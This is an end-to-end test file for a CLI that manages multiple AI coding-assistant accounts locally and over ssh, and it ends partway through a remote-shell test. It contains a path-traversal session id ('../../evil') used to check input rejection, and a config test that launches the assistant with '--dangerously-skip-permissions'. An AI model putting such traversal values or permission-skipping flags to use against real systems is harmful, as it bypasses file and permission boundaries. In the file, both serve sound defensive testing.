import { afterEach, beforeEach, describe, expect, it, setDefaultTimeout } from 'bun:test';
import { spawnSync } from 'node:child_process';
import {
  chmodSync,
  existsSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  readlinkSync,
  realpathSync,
  statSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { arch, platform, tmpdir } from 'node:os';
import { delimiter } from 'node:path';
import { FavoVersion } from '@favo/contracts/version';
import { installFakes } from './support/fake-bin/install-fakes';
import { removeFolder } from './support/remove-folder';

setDefaultTimeout(60_000);

const Main = `${import.meta.dir}/../src/main.ts`;
const isWindows = process.platform === 'win32';
const RemoteFavo = `#!/bin/bash\nexec bun ${Main} "$@"\n`;
const NoPricesUrl = 'http://127.0.0.1:9/prices.json';
const HostileFavo = `#!/bin/sh\nexec bun "${import.meta.dir}/support/fake-bin/hostile-favo.ts" "$@"\n`;

let root: string;
let home: string;
let remoteHome: string;
let fakeBin: string;

async function favo(args: string[], extraEnv: Record<string, string> = {}, cwd?: string) {
  const child = Bun.spawn(['bun', Main, ...args], {
    cwd,
    env: {
      PATH: `${fakeBin}${delimiter}${process.env.PATH}`,
      HOME: home,
      FAVO_HOSTNAME: 'test-mac',
      FAKE_SSH_LOG: `${root}/ssh.log`,
      FAKE_REMOTE_HOME: remoteHome,
      FAVO_PRICES_URL: NoPricesUrl,
      NO_COLOR: '1',
      ...extraEnv,
    },
    stdin: 'ignore',
    stdout: 'pipe',
    stderr: 'pipe',
  });
  const [stdout, stderr, code] = await Promise.all([
    new Response(child.stdout).text(),
    new Response(child.stderr).text(),
    child.exited,
  ]);
  return { stdout, stderr, code };
}

beforeEach(() => {
  root = mkdtempSync(`${tmpdir()}/favo-e2e-`).replaceAll('\\', '/');
  fakeBin = `${root}/bin`;
  mkdirSync(fakeBin);
  installFakes(fakeBin);
  home = `${root}/home`;
  remoteHome = `${root}/remote`;
  mkdirSync(`${home}/.claude/skills`, { recursive: true });
  writeFileSync(`${home}/.claude/CLAUDE.md`, 'be kind');
  writeFileSync(`${home}/.claude/settings.json`, '{}');
  writeFileSync(`${home}/.claude/identity`, 'personal@bee.dev');
  mkdirSync(remoteHome, { recursive: true });
});

afterEach(() => removeFolder(root));

describe('favo update', () => {
  it('runs the provider command with the terminal attached, and reports the result', async () => {
    writeFileSync(`${root}/codex-version`, '0.1.0');
    const { stdout, code } = await favo(['update', '--skip-favo', '--providers', '--machine', 'local'], {
      FAKE_CODEX_VERSION_FILE: `${root}/codex-version`,
    });
    expect(code).toBe(0);
    expect(stdout).toContain('Codex 0.1.0, own install at');
    expect(stdout).toContain('fake codex updating');
    expect(stdout).toContain('Codex 0.1.0 → 0.2.0');
    expect(existsSync(`${home}/.favo/updates/codex.json`)).toBe(false);
    expect(JSON.parse(readFileSync(`${home}/.favo/updates/antigravity.json`, 'utf8'))).toMatchObject({
      state: 'leftAlone',
      reason: 'it updates itself, or through whatever installed it',
    });
  });
  it('updates favo alone unless the provider CLIs are asked for', async () => {
    const { stdout, code } = await favo(['update', '--machine', 'local']);
    expect(code).toBe(0);
    expect(stdout).not.toContain('fake codex updating');
    expect(stdout).toContain('favo update --providers');
  });
  it('leaves a provider whose updates are off, reporting why', async () => {
    const { stdout, code } = await favo(['update', '--skip-favo', '--providers', '--machine', 'local'], {
      DISABLE_UPDATES: '1',
    });
    expect(code).toBe(0);
    expect(stdout).toContain('its updates are turned off by DISABLE_UPDATES');
    expect(stdout).not.toContain('fake claude updating');
  });
  it('leaves a running provider alone when nobody can answer', async () => {
    const launch = Bun.spawn(['bun', Main, 'codex'], {
      env: {
        PATH: `${fakeBin}${delimiter}${process.env.PATH}`,
        HOME: home,
        FAKE_CODEX_HOLD: `${root}/codex-release`,
        NO_COLOR: '1',
      },
      stdin: 'ignore',
      stdout: 'ignore',
      stderr: 'ignore',
    });
    const folder = `${home}/.favo/running/personal/codex`;
    for (let attempt = 0; attempt < 200 && !existsSync(folder); attempt++) await Bun.sleep(25);
    for (let attempt = 0; attempt < 200 && readdirSync(folder).length === 0; attempt++) await Bun.sleep(25);
    const { stdout } = await favo(['update', '--skip-favo', '--providers', '--machine', 'local']);
    writeFileSync(`${root}/codex-release`, '');
    await launch.exited;
    expect(stdout).toContain('it is running');
    expect(stdout).not.toContain('fake codex updating');
    expect(readdirSync(folder)).toEqual([]);
  });
});

describe('favo usage', () => {
  it('reads a real conversation with the provider and prints what is left', async () => {
    const { stdout, code } = await favo(['usage']);
    expect(code).toBe(0);
    expect(stdout).toContain('Claude Code');
    expect(stdout).toContain('68% left');
    expect(stdout).toMatch(/personal +[▄█▂▁]+ +↻ 44m/);
  });
  it('reads the subscription even with an API key around', async () => {
    const { stdout } = await favo(['usage'], { ANTHROPIC_API_KEY: 'sk-test', CLAUDE_CODE_ENTRYPOINT: 'cli' });
    expect(stdout).toContain('68% left');
    expect(stdout).not.toContain('no subscription limits');
  });
  it('starts each read in an empty folder, whatever folder favo runs from', async () => {
    mkdirSync(`${root}/project`);
    writeFileSync(`${root}/project/settings.json`, '{}');
    const { stdout } = await favo(['usage'], {}, `${root}/project`);
    expect(stdout).toContain('68% left');
  });
  it('reads a seat that lives in a cell, from its own folder', async () => {
    await favo(['add', 'work']);
    const path = (await favo(['path', 'claude', 'work'])).stdout.trim();
    writeFileSync(`${path}/identity`, 'work@bee.dev');
    const { stdout } = await favo(['usage']);
    expect(stdout).toContain('Session');
    expect(stdout).toMatch(/work +[▄█▂▁]+ +68%/);
  });
  it('reads Codex from its app server', async () => {
    mkdirSync(`${home}/.codex`, { recursive: true });
    writeFileSync(`${home}/.codex/identity`, 'bee@hive.dev');
    const { stdout } = await favo(['usage']);
    expect(stdout).toContain('Codex');
    expect(stdout).toContain('90% left');
  });
  it('tells seats apart from inside a seat, whatever its shell inherited', async () => {
    await favo(['add', 'work']);
    const path = (await favo(['path', 'claude', 'work'])).stdout.trim();
    writeFileSync(`${path}/identity`, 'work@bee.dev');
    const { stdout } = await favo(['usage', '--json'], { CLAUDE_CONFIG_DIR: path });
    const [{ seats }] = JSON.parse(stdout);
    const identities = seats.map(({ account, identity }: { account: string; identity: string }) => [account, identity]);
    expect(identities).toEqual([
      ['personal', 'personal@bee.dev'],
      ['work', 'work@bee.dev'],
    ]);
  });
  it.skipIf(isWindows)('stops the read when the machine asking for it goes away', async () => {
    const child = Bun.spawn(['bun', Main, 'serve', '--stdio'], {
      env: { PATH: `${fakeBin}${delimiter}${process.env.PATH}`, HOME: home, FAKE_USAGE_HANG: '1' },
      stdin: 'pipe',
      stdout: 'pipe',
      stderr: 'pipe',
    });
    const started = Date.now();
    child.stdin.write(`${JSON.stringify({ id: 1, method: 'seats.usage', params: {} })}\n`);
    await child.stdin.flush();
    await Bun.sleep(1000);
    await child.stdin.end();
    await child.exited;
    expect(Date.now() - started).toBeLessThan(5000);
  });
  it('gives machine readable output', async () => {
    const { stdout } = await favo(['usage', '--json']);
    const [{ machine, seats }] = JSON.parse(stdout);
    expect(machine.id).toBe('local');
    expect(seats[0].usage.windows[0]).toMatchObject({ id: 'five_hour', usedPercent: 32 });
  });
});

describe('favo and the provider hooks', () => {
  const Session = '11111111-2222-4333-8444-555555555555';
  const settingsPath = () => `${home}/.claude/settings.json`;

  async function installed() {
    await favo(['hooks', 'install']);
    await favo(['add', 'work']);
    mkdirSync(`${root}/project`, { recursive: true });
    return realpathSync(`${root}/project`).replaceAll('\\', '/');
  }

  function threadsOf(stdout: string) {
    const threads = JSON.parse(stdout) as { id: string; directory: string; isGuess: boolean }[];
    return threads.map((thread) => ({ ...thread, directory: thread.directory.replaceAll('\\', '/') }));
  }

  function hookCommand() {
    const { hooks } = JSON.parse(readFileSync(settingsPath(), 'utf8'));
    return hooks.SessionStart[0].hooks[0].command as string;
  }

  function runHookLine(env: Record<string, string>, input = '{}') {
    return spawnSync(hookCommand(), {
      shell: true,
      input,
      encoding: 'utf8',
      env: { PATH: process.env.PATH, HOME: home, ...env },
      cwd: root,
    });
  }

  it('remembers a thread when the provider reports it through the real hook line', async () => {
    const project = await installed();
    const launched = await favo(['claude', 'work'], { FAKE_SESSION: Session }, project);
    expect(launched.stdout).not.toContain('hook wrote to the conversation');
    const { stdout } = await favo(['threads', 'claude', 'work', '--json'], {}, project);
    expect(threadsOf(stdout)).toMatchObject([{ id: Session, directory: project, isGuess: false }]);
  });
  it('reads a report that starts with byte order marks, as Windows PowerShell sends it', async () => {
    const project = await installed();
    const payload = `\uFEFF\uFEFF${JSON.stringify({ session_id: Session, cwd: project, source: 'startup' })}`;
    const child = Bun.spawn(['bun', Main, 'hook', 'claude'], {
      cwd: project,
      env: {
        PATH: process.env.PATH,
        HOME: home,
        FAVO_ACCOUNT: 'work',
        CLAUDE_CONFIG_DIR: `${home}/.favo/accounts/work/claude`,
      },
      stdin: new TextEncoder().encode(payload),
    });
    expect(await child.exited).toBe(0);
    const { stdout } = await favo(['threads', 'claude', 'work', '--json'], {}, project);
    expect(threadsOf(stdout)).toMatchObject([{ id: Session, directory: project }]);
  });
  it('keeps a folder with an accent in its name', async () => {
    await installed();
    mkdirSync(`${root}/projeção`);
    const project = realpathSync(`${root}/projeção`).replaceAll('\\', '/');
    await favo(['claude', 'work'], { FAKE_SESSION: Session }, project);
    const { stdout } = await favo(['threads', 'claude', 'work', '--json'], {}, project);
    expect(threadsOf(stdout)).toMatchObject([{ id: Session, directory: project }]);
  });
  it('goes back to it from anywhere, in its own folder, with what you pass after --', async () => {
    const project = await installed();
    await favo(['claude', 'work'], { FAKE_SESSION: Session }, project);
    const { stdout } = await favo(['resume', 'claude', 'work', '--', '--model', 'x']);
    expect(stdout).toContain(`args=--resume ${Session} --model x`);
    expect(stdout).toContain(`cwd=${project}`);
    expect(stdout).toContain(`home=${home}/.favo/accounts/work/claude`);
  });
  it('still finds it after a rename', async () => {
    const project = await installed();
    await favo(['claude', 'work'], { FAKE_SESSION: Session }, project);
    await favo(['rename', 'work', 'side']);
    const { stdout } = await favo(['resume', 'claude', 'side']);
    expect(stdout).toContain(`args=--resume ${Session}`);
  });
  it('finds it by the old name too, which a saved Herdr pane still holds', async () => {
    const project = await installed();
    await favo(['claude', 'work'], { FAKE_SESSION: Session }, project);
    await favo(['rename', 'work', 'side']);
    const { stdout } = await favo(['resume', 'claude', 'work', Session]);
    expect(stdout).toContain(`home=${home}/.favo/accounts/work/claude`);
  });
  it('does not show a session that never got a message', async () => {
    const project = await installed();
    await favo(['claude', 'work'], { FAKE_SESSION: Session, FAKE_EMPTY_SESSION: '1' }, project);
    expect((await favo(['threads', 'claude', 'work'], {}, project)).stdout).toContain('No threads yet.');
  });
  it('explains itself when there is nothing to go back to', async () => {
    await installed();
    const { stderr, code } = await favo(['resume', 'claude', 'work']);
    expect(code).toBe(1);
    expect(stderr).toContain('favo has no thread for work on Claude Code');
  });
  it('keeps the user config and the seat link', async () => {
    writeFileSync(settingsPath(), '{\n    "model": "opus"\n}\n');
    await installed();
    expect(readFileSync(settingsPath(), 'utf8')).toContain('\n    "model": "opus"');
    await favo(['claude', 'work']);
    const seat = `${home}/.favo/accounts/work/claude/settings.json`;
    expect(lstatSync(seat).isFile()).toBe(false);
  });
  it('takes itself out and leaves the config as it found it', async () => {
    writeFileSync(settingsPath(), '{\n    "model": "opus"\n}\n');
    await installed();
    await favo(['hooks', 'uninstall']);
    expect(readFileSync(settingsPath(), 'utf8')).toBe('{\n    "model": "opus"\n}\n');
    expect(existsSync(`${home}/.config/opencode/plugins/favo-threads.js`)).toBe(false);
  });
  it('tells Herdr the thread, and lets go of the pane when the provider exits', async () => {
    const project = await installed();
    const log = `${root}/herdr.log`;
    const herdr = {
      HERDR_ENV: '1',
      HERDR_BIN_PATH: `${fakeBin}/herdr${isWindows ? '.cmd' : ''}`,
      HERDR_PANE_ID: 'p1',
      FAKE_HERDR_LOG: log,
    };
    await favo(['claude', 'work'], { FAKE_SESSION: Session, ...herdr }, project);
    const [report, release] = readFileSync(log, 'utf8').trim().split('\n');
    expect(report).toStartWith(
      `pane report-agent-session p1 --source favo --agent claude --agent-session-id ${Session} --seq `
    );
    expect(report).toEndWith(`-- favo resume claude work ${Session}`);
    expect(release).toStartWith('pane release-agent p1 --source favo --agent claude --seq ');
  });
  it('asks Herdr again while it is not ready for the report', async () => {
    await installed();
    const log = `${root}/herdr.log`;
    const child = Bun.spawn(['bun', Main, 'hook', 'claude', '--report', Session], {
      env: {
        PATH: `${fakeBin}${delimiter}${process.env.PATH}`,
        HOME: home,
        FAVO_ACCOUNT: 'work',
        HERDR_ENV: '1',
        HERDR_BIN_PATH: `${fakeBin}/herdr${isWindows ? '.cmd' : ''}`,
        HERDR_PANE_ID: 'p1',
        FAKE_HERDR_LOG: log,
        FAKE_HERDR_REFUSALS: '1',
      },
      stdin: 'ignore',
    });
    expect(await child.exited).toBe(0);
    const calls = readFileSync(log, 'utf8').trim().split('\n');
    expect(calls).toHaveLength(2);
    expect(calls[1]).toEndWith(`-- favo resume claude work ${Session}`);
  });
  it('does nothing outside favo, quietly', async () => {
    await installed();
    const { status, stdout, stderr } = runHookLine({}, JSON.stringify({ session_id: Session, cwd: root }));
    expect(status).toBe(0);
    expect(stdout).toBe('');
    expect(stderr).toBe('');
    expect(existsSync(`${home}/.favo/threads`)).toBe(false);
  });
  it('stays silent when favo is gone, as it is after a brew uninstall', async () => {
    await installed();
    const { status, stdout, stderr } = runHookLine({ FAVO_ACCOUNT: 'work', FAVO_BIN: `${root}/no-such-favo` });
    expect(status).toBe(0);
    expect(stdout).toBe('');
    expect(stderr).toBe('');
  });
  it('prints nothing and succeeds on input it cannot read', async () => {
    const payloads = ['not json', '', '{"session_id":"../../evil"}'];
    for (const payload of payloads) {
      const child = Bun.spawn(['bun', Main, 'hook', 'claude', '1'], {
        env: { PATH: process.env.PATH, HOME: home, FAVO_ACCOUNT: 'work' },
        stdin: new TextEncoder().encode(payload),
        stdout: 'pipe',
        stderr: 'pipe',
      });
      const [stdout, stderr, code] = await Promise.all([
        new Response(child.stdout).text(),
        new Response(child.stderr).text(),
        child.exited,
      ]);
      expect({ stdout, stderr, code }).toEqual({ stdout: '', stderr: '', code: 0 });
    }
  });
  it('prints nothing and succeeds for a provider it does not know', async () => {
    const child = Bun.spawn(['bun', Main, 'hook', 'gemini'], {
      env: { PATH: process.env.PATH, HOME: home, FAVO_ACCOUNT: 'work' },
      stdin: 'ignore',
      stdout: 'pipe',
    });
    expect(await new Response(child.stdout).text()).toBe('');
    expect(await child.exited).toBe(0);
  });
  it('shows the state of each hook', async () => {
    await installed();
    const { stdout } = await favo(['hooks']);
    expect(stdout).toContain('Claude Code   on');
    expect(stdout).toContain('asks each seat once');
  });
});

describe('favo on this machine', () => {
  it('adds an account, links the shared walls and keeps the login sealed', async () => {
    expect((await favo(['add', 'work'])).code).toBe(0);
    const path = (await favo(['path', 'claude', 'work'])).stdout.trim();
    expect(path.replaceAll('\\', '/')).toBe(`${home}/.favo/accounts/work/claude`);
    expect(readFileSync(`${path}/CLAUDE.md`, 'utf8')).toBe('be kind');
    expect(lstatSync(`${path}/skills`).isSymbolicLink()).toBe(true);
    expect(existsSync(`${path}/identity`)).toBe(false);
  });
  it('runs the provider as the account, with its arguments, and returns its exit code', async () => {
    await favo(['add', 'work']);
    const result = await favo(['claude', 'work', '--', '--resume', 'abc']);
    expect(result.stdout).toContain(`home=${home}/.favo/accounts/work/claude`);
    expect(result.stdout).toContain('args=--resume abc');
    expect(result.code).toBe(3);
  });
  it('starts the provider in the folder you asked for', async () => {
    mkdirSync(`${root}/project`);
    const { stdout } = await favo(['--dir', `${root}/project`, 'claude']);
    expect(realpathSync(/cwd=(\S+)/.exec(stdout)![1]!).replaceAll('\\', '/')).toBe(
      realpathSync(`${root}/project`).replaceAll('\\', '/')
    );
  });
  it('refuses a folder that is not there', async () => {
    const result = await favo(['--dir', `${root}/nothing`, 'claude']);
    expect(result.code).toBe(1);
    expect(result.stderr).toContain('No folder at');
  });
  it('runs personal with the provider own folder and no isolation', async () => {
    expect((await favo(['claude'])).stdout).toContain(`home=${home}/.claude`);
  });
  it('keeps two accounts signed in at once', async () => {
    await favo(['add', 'work']);
    await favo(['login', 'claude', 'work']);
    const { stdout } = await favo(['list']);
    expect(stdout).toContain('personal@bee.dev');
    expect(stdout).toContain('signed-in@bee.dev');
  });
  it('reads Codex identity through the app server of each account', async () => {
    await favo(['add', 'work']);
    const path = (await favo(['path', 'codex', 'work'])).stdout.trim();
    writeFileSync(`${path}/identity`, 'codex@bee.dev');
    expect((await favo(['list'])).stdout).toContain('codex@bee.dev · plus');
  });
  it('gives Antigravity a private home that still has the git identity', async () => {
    writeFileSync(`${home}/.gitconfig`, '[user] name = bee');
    await favo(['add', 'work']);
    const { stdout } = await favo(['agy', 'work']);
    expect(stdout).toContain(`home=${home}/.favo/accounts/work/antigravity`);
    expect(stdout).toContain('gitconfig=[user] name = bee');
  });
  it('runs OpenCode standalone with its own data', async () => {
    await favo(['add', 'work']);
    const { stdout } = await favo(['opencode', 'work']);
    expect(stdout).toContain(`data=${home}/.favo/accounts/work/opencode`);
    expect(stdout).toContain('args=--standalone');
  });
  it('heals a link at launch, without a schedule', async () => {
    await favo(['add', 'work']);
    await favo(['path', 'claude', 'work']);
    mkdirSync(`${home}/.claude/commands`);
    await favo(['claude', 'work']);
    expect(lstatSync(`${home}/.favo/accounts/work/claude/commands`).isSymbolicLink()).toBe(true);
  });
  it('applies the tmux fix only inside tmux', async () => {
    const inside = await favo(['claude'], { TMUX: '/tmp/tmux', TERM: 'tmux-ghostty' });
    expect(inside.stdout).toContain('tmux=none term=xterm-256color');
    const outside = await favo(['claude'], { TERM: 'xterm-ghostty' });
    expect(outside.stdout).toContain('term=xterm-ghostty');
  });
  it('reads launch arguments from the config', async () => {
    mkdirSync(`${home}/.favo`, { recursive: true });
    writeFileSync(
      `${home}/.favo/config.json`,
      JSON.stringify({ providers: { claude: { launchArgs: ['--dangerously-skip-permissions'] } } })
    );
    expect((await favo(['claude'])).stdout).toContain('args=--dangerously-skip-permissions');
  });
  it('moves a removed account to the trash', async () => {
    await favo(['add', 'work']);
    const { stdout } = await favo(['rm', 'work']);
    expect(stdout.replaceAll('\\', '/')).toContain(`${home}/.favo/trash/work-`);
    expect(stdout).toContain('until you delete that folder');
    expect(existsSync(`${home}/.favo/accounts/work`)).toBe(false);
  });
  it('adopts an old config folder', async () => {
    mkdirSync(`${home}/.claude-work/projects`, { recursive: true });
    writeFileSync(`${home}/.claude-work/projects/thread.jsonl`, 'hello');
    expect((await favo(['adopt', 'claude', 'work', '~/.claude-work'])).code).toBe(0);
    expect(readFileSync(`${home}/.favo/accounts/work/claude/projects/thread.jsonl`, 'utf8')).toBe('hello');
    expect(readFileSync(`${home}/.favo/accounts/work/claude/CLAUDE.md`, 'utf8')).toBe('be kind');
  });
  it('never moves the base, however it is spelled', async () => {
    mkdirSync(`${home}/hop`);
    symlinkSync(home, `${home}/hop/back`, 'junction');
    const spellings = ['~/.claude', '.claude', './.claude/', 'hop/../.claude', 'hop/back/.claude', home];
    for (const from of spellings) {
      const result = await favo(['adopt', 'claude', 'work', from], {}, home);
      expect({ from, code: result.code }).toEqual({ from, code: 1 });
      expect(result.stderr).toContain('favo never moves');
    }
    expect(readFileSync(`${home}/.claude/CLAUDE.md`, 'utf8')).toBe('be kind');
    expect(existsSync(`${home}/.favo/accounts/work`)).toBe(false);
  });
  it('never takes the seat of another account', async () => {
    await favo(['add', 'other']);
    await favo(['path', 'claude', 'other']);
    const result = await favo(['adopt', 'claude', 'work', '~/.favo/accounts/other/claude']);
    expect(result.stderr).toContain('favo never moves');
    expect(existsSync(`${home}/.favo/accounts/other/claude`)).toBe(true);
  });
  it('never writes through a link in an adopted folder', async () => {
    mkdirSync(`${home}/.gemini`);
    writeFileSync(`${home}/.gemini/GEMINI.md`, 'be kind');
    mkdirSync(`${root}/outside`);
    mkdirSync(`${home}/old-seat`);
    symlinkSync(`${root}/outside`, `${home}/old-seat/.gemini`, 'junction');
    await favo(['adopt', 'agy', 'work', '~/old-seat']);
    expect(readdirSync(`${root}/outside`)).toEqual([]);
  });
  it('lists and removes an account named like an inherited property', async () => {
    expect((await favo(['add', 'constructor'])).code).toBe(0);
    expect((await favo(['list'])).stdout).toContain('  constructor');
    expect((await favo(['rm', 'constructor'])).code).toBe(0);
  });
  it('saves a theme and reads a custom one from disk', async () => {
    mkdirSync(`${home}/.favo/themes`, { recursive: true });
    writeFileSync(`${home}/.favo/themes/mine.json`, JSON.stringify({ name: 'Mine', colors: { accent: '#112233' } }));
    expect((await favo(['theme', 'mine'])).code).toBe(0);
    expect(JSON.parse(readFileSync(`${home}/.favo/config.json`, 'utf8')).theme).toBe('mine');
    expect((await favo(['theme'])).stdout).toContain('▸ mine');
  });
  it('still runs providers when the config is broken for themes but not for launch', async () => {
    mkdirSync(`${home}/.favo/themes`, { recursive: true });
    writeFileSync(`${home}/.favo/themes/bad.json`, '{ nope');
    expect((await favo(['claude'])).stdout).toContain(`home=${home}/.claude`);
  });
  it('reports a friendly error and exit code', async () => {
    const result = await favo(['login', 'claude', 'ghost']);
    expect(result.code).toBe(1);
    expect(result.stderr).toContain('favo: No account named "ghost".');
  });
});

describe('favo usage --tokens', () => {
  const Million = 1_000_000;
  const hoursAgo = (hours: number) => new Date(Date.now() - hours * 3_600_000).toISOString();

  function writeLogs(target: string) {
    const usage = {
      input_tokens: Million,
      cache_read_input_tokens: 20 * Million,
      cache_creation_input_tokens: 2 * Million,
      output_tokens: Million,
    };
    const message = { id: 'msg_one', model: 'claude-test-1', content: [{ type: 'text', text: 'never read' }], usage };
    const line = { type: 'assistant', timestamp: hoursAgo(2), requestId: 'req_one', sessionId: 'session-a', message };
    mkdirSync(`${target}/.claude/projects/-hive`, { recursive: true });
    writeFileSync(
      `${target}/.claude/projects/-hive/session-a.jsonl`,
      `${JSON.stringify(line)}\n${JSON.stringify(line)}\n`
    );
    const counters = { input_tokens: 10 * Million, cached_input_tokens: 8 * Million, output_tokens: 2 * Million };
    const info = { last_token_usage: counters, total_token_usage: counters };
    const rollout = [
      { timestamp: hoursAgo(3), type: 'session_meta', payload: { id: 'session-c' } },
      { timestamp: hoursAgo(3), type: 'turn_context', payload: { model: 'gpt-test-1' } },
      { timestamp: hoursAgo(3), type: 'event_msg', payload: { type: 'token_count', info } },
    ];
    const text = rollout.map((each) => JSON.stringify(each)).join('\n');
    mkdirSync(`${target}/.codex/sessions/2026/11`, { recursive: true });
    writeFileSync(`${target}/.codex/sessions/2026/11/rollout-c.jsonl.zst`, Bun.zstdCompressSync(Buffer.from(text)));
  }

  it('counts the logs on disk, a compressed rollout included, and keeps the record', async () => {
    writeLogs(home);
    const { stdout, code } = await favo(['usage', '--tokens']);
    expect(code).toBe(0);
    expect(stdout).toContain('Tokens   last 30 days · all machines · all accounts · all providers');
    expect(stdout).toContain('36M tokens   2 sessions');
    expect(stdout).toMatch(/Claude Code +▄+▂+ +24M +67%/);
    expect(stdout).toMatch(/Codex +▄+▂+ +12M +33%/);
    expect(stdout).not.toContain('$');
    const record = JSON.parse(readFileSync(`${home}/.favo/usage/tokens.json`, 'utf8'));
    expect(record.rows).toHaveLength(2);
    expect(statSync(`${home}/.favo/usage/tokens.json`).mode & 0o077).toBe(isWindows ? statSync(home).mode & 0o077 : 0);
  });
  it('keeps the count when the logs are gone, as Claude Code deletes them after 30 days', async () => {
    writeLogs(home);
    await favo(['usage', '--tokens']);
    removeFolder(`${home}/.claude/projects`);
    const { stdout } = await favo(['usage', '--tokens']);
    expect(stdout).toContain('36M tokens   2 sessions');
  });
  it('prices the tokens from the table it fetched, and keeps a copy for when it is offline', async () => {
    writeLogs(home);
    const table = {
      'claude-test-1': {
        input_cost_per_token: 0.000003,
        output_cost_per_token: 0.000015,
        cache_read_input_token_cost: 0.0000003,
        cache_creation_input_token_cost: 0.00000375,
      },
      'openai/gpt-test-1': { input_cost_per_token: 0.000002, output_cost_per_token: 0.000008 },
    };
    const server = Bun.serve({ hostname: '127.0.0.1', port: 0, fetch: () => Response.json(table) });
    const online = await favo(['usage', '--cost'], { FAVO_PRICES_URL: `http://127.0.0.1:${server.port}/prices.json` });
    await server.stop(true);
    expect(online.stdout).toContain('$67.50 at API prices   36M tokens   $54.00 saved by cache');
    expect(online.stdout).toContain('not your subscription bill');
    const offline = await favo(['usage', '--tokens', '--json']);
    const document = JSON.parse(offline.stdout);
    expect(document.prices.source).toBe('litellm');
    expect(document.days.map((day: { cost: number }) => day.cost).toSorted()).toEqual([31.5, 36]);
    expect(document.machines[0]).toMatchObject({ id: 'local', name: 'test-mac' });
  });
  it('refuses two pages at once, and a period on limits', async () => {
    const both = await favo(['usage', '--tokens', '--cost']);
    expect(both.code).toBe(1);
    expect(both.stderr).toContain('favo: Pick one of --limits, --tokens and --cost.');
    const period = await favo(['usage', '--days', '7']);
    expect(period.stderr).toContain('favo: Limits have no period.');
  });
});

describe.skipIf(isWindows)('favo with another machine', () => {
  function installAsset() {
    const system = platform() === 'darwin' ? 'darwin' : 'linux';
    mkdirSync(`${home}/.favo/assets/${FavoVersion}`, { recursive: true });
    writeFileSync(`${home}/.favo/assets/${FavoVersion}/favo-${system}-${arch()}`, RemoteFavo);
  }

  async function joinRemote() {
    installAsset();
    mkdirSync(`${remoteHome}/.claude`, { recursive: true });
    writeFileSync(`${remoteHome}/.claude/CLAUDE.md`, 'remote walls');
    writeFileSync(`${remoteHome}/.claude/identity`, 'remote@bee.dev');
    return favo(['machine', 'add', 'bee@remote']);
  }

  it('installs itself over ssh and answers from the other side', async () => {
    const added = await joinRemote();
    expect(added.stdout).toContain(`favo ${FavoVersion} is running on remote`);
    expect(existsSync(`${remoteHome}/.favo/bin/favo`)).toBe(true);
    const { stdout } = await favo(['machine', 'list', '--json']);
    const machines = JSON.parse(stdout);
    expect(machines[1]).toMatchObject({ id: 'remote', state: 'online', hostname: 'fake-remote' });
  });
  it('reads usage on the other machine, over the same pipe', async () => {
    await joinRemote();
    const { stdout } = await favo(['usage', '--machine', 'remote']);
    expect(stdout).toContain('68% left');
  });
  it('counts tokens on the other machine, over the same pipe, and keeps what it said', async () => {
    await joinRemote();
    const line = {
      type: 'assistant',
      timestamp: new Date(Date.now() - 3_600_000).toISOString(),
      requestId: 'req_remote',
      sessionId: 'session-remote',
      message: { id: 'msg_remote', model: 'claude-test-1', usage: { input_tokens: 7_000_000, output_tokens: 0 } },
    };
    mkdirSync(`${remoteHome}/.claude/projects/-srv`, { recursive: true });
    writeFileSync(`${remoteHome}/.claude/projects/-srv/session-remote.jsonl`, JSON.stringify(line));
    const { stdout } = await favo(['usage', '--tokens', '--machine', 'remote']);
    expect(stdout).toContain('1 of 2 machines');
    expect(stdout).toContain('7M tokens   1 session');
    expect(JSON.parse(readFileSync(`${home}/.favo/usage/machines/remote.json`, 'utf8')).rows).toHaveLength(1);
    expect(existsSync(`${remoteHome}/.favo/usage/tokens.json`)).toBe(true);
  });
  it('shows both machines in one list', async () => {
    await joinRemote();
    const { stdout } = await favo(['list']);
    expect(stdout).toContain('test-mac this machine · online');
    expect(stdout).toContain('remote bee@remote · online');
    expect(stdout).toContain('personal@bee.dev');
    expect(stdout).toContain('remote@bee.dev');
  });
  it('creates an account over there, with links over there', async () => {
    await joinRemote();
    await favo(['add', 'side', '-m', 'remote']);
    const path = (await favo(['path', 'claude', 'side', '-m', 'remote'])).stdout.trim();
    expect(path).toBe(`${remoteHome}/.favo/accounts/side/claude`);
    expect(readlinkSync(`${path}/CLAUDE.md`)).toBe(`${remoteHome}/.claude/CLAUDE.md`);
    expect(existsSync(`${home}/.favo/accounts/side`)).toBe(false);
  });
  it('starts in a folder on the other machine, and checks it there', async () => {
    await joinRemote();
    mkdirSync(`${remoteHome}/my project`);
    const { stdout } = await favo(['-m', 'remote', '--dir', `${remoteHome}/my project`, 'claude']);
    expect(stdout).toContain('/my project');
    const missing = await favo(['-m', 'remote', '--dir', `${remoteHome}/nothing`, 'claude']);
    expect(missing.stderr).toContain('No folder at');
  });
  it('updates the provider CLIs here, then over there through a real terminal', async () => {
    await joinRemote();
    const { stdout, code } = await favo(['update', '--skip-favo', '--providers']);
    expect(code).toBe(0);
    expect(stdout).toContain('Provider CLIs on remote');
    expect(stdout.match(/fake codex updating/g)).toHaveLength(2);
    expect(readFileSync(`${root}/ssh.log`, 'utf8')).toMatch(
      /-t -- bee@remote ~\/\.favo\/bin\/favo --argv-b64 [A-Za-z0-9_-]+\n/
    );
    expect(existsSync(`${remoteHome}/.favo/updates/antigravity.json`)).toBe(true);
    expect(existsSync(`${remoteHome}/.favo/updates/codex.json`)).toBe(false);
  });
  it('updates only the machine you name', async () => {
    await joinRemote();
    const { stdout, code } = await favo(['update', '--providers', '--machine', 'remote']);
    expect(code).toBe(0);
    expect(stdout.match(/fake codex updating/g)).toHaveLength(1);
    expect(existsSync(`${home}/.favo/updates/antigravity.json`)).toBe(false);
  });
  it('leaves the provider CLIs on every machine alone unless asked', async () => {
    await joinRemote();
    const { stdout, code } = await favo(['update']);
    expect(code).toBe(0);
    expect(stdout).not.toContain('fake codex updating');
  });
  it('launches over ssh with a real terminal', async () => {
    await joinRemote();
    await favo(['add', 'side', '-m', 'remote']);
    const { stdout } = await favo(['-m', 'remote', 'claude', 'side', '--', 'hi there']);
    expect(stdout).toContain(`home=${remoteHome}/.favo/accounts/side/claude`);
    expect(stdout).toContain('args=hi there');
    expect(readFileSync(`${root}/ssh.log`, 'utf8')).toMatch(
      /-t -- bee@remote ~\/\.favo\/bin\/favo --argv-b64 [A-Za-z0-9_-]+\n/
    );
  });
  it('carries any argument across a real shell, and that shell runs none of it', async () => {
    await joinRemote();
